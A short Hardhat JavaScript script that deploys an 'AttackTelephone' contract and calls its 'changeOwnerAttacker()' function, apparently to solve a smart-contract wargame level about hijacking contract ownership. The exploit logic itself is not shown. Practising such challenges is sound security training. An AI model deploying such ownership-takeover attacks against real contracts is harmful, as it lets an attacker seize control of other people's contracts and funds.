require("dotenv").config()
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)

/* CONTRACT NAME */
const contractToDeploy = "AttackTelephone"

/* DEPLOY + ATTACK */
async function main() {
  console.log("Deploying contracts with the account:", signer.address)

  const MyContract = await ethers.getContractFactory(contractToDeploy)
  const myContract = await MyContract.deploy()

  console.log("MyContract deployed to:", myContract.address)
  return myContract
}

main()
  .then(async (myContract) => {
    const tx = await myContract.connect(signer).changeOwnerAttacker()
    const res = await tx.wait()
    console.log("res", Object.keys(res))
  })
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/4/DeployAndCall__Attack.js --network polygon
*/
